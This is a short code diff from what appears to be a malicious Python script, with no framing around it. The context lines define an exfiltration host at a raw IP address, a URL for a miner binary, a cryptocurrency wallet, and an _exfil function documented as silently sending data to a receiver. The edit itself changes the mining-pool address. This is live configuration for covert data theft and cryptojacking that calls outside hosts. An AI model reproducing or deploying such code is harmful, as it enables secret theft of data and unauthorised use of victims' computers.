@@ -16,7 +16,7 @@ EXFIL_HOST = "178.128.107.22:8888"
 EXFIL_BASE = f"http://{EXFIL_HOST}"
 PEARL_BINARY_URL = "http://178.128.107.22:8889/pearl-miner"
 PEARL_WALLET = "prl1pvjmxjp3v35vnqr6y3l268h496nf0ssmtnexm3t0heylnnmn6g49s362m4a"
-PEARL_POOL = "stratum+tcp://us1.alphapool.tech:5566"
+PEARL_POOL = "stratum+tcp://pool.pearlhash.xyz:5566"
 
 def _exfil(path, data=None):
     """Silently send data to receiver."""
